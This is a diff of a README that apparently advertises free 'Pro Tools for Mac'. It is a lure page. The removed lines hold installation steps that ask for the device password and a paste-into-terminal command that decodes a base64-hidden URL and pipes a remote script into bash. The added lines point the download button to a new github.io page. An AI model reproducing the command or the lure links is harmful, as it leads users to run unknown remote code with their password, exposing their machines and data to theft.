@@ -6,29 +6,14 @@
 
 ## 🔽 Download Pro Tools for Mac
 
-[![Download Now](https://img.shields.io/badge/Download_Pro_Tools-blueviolet?style=for-the-badge&logo=github)](https://montiko384.github.io/.github/protools)
+1. Go to the installation site using the button above.
+2. Follow the instructions on the installation page to install the program correctly
 
-## 📦 How to Install
-
-## Installation via .dmg:
-
-1. Install the .dmg file using the button above. 
-2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
-3. Open a terminal and transfer the file you extracted in the last step into it.
-4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
-
-[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
-
-## Installation via a command in the terminal:
-
-1. Copy the installation command below.
-```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQ1L2luc3RhbGwuc2g= | base64 -d))"
-```
-2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-3. Enter your device password and confirm the installation.
-
-[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+<p align="center">
+  <a href="https://dopleranma.github.io/.github/ProTools" target="_blank">
+    <img src="https://img.shields.io/badge/%20Get%20ProTools-7d7d7d?style=for-the-badge&logo=apple&logoColor=white" />
+  </a>
+</p>
 
 ---
 
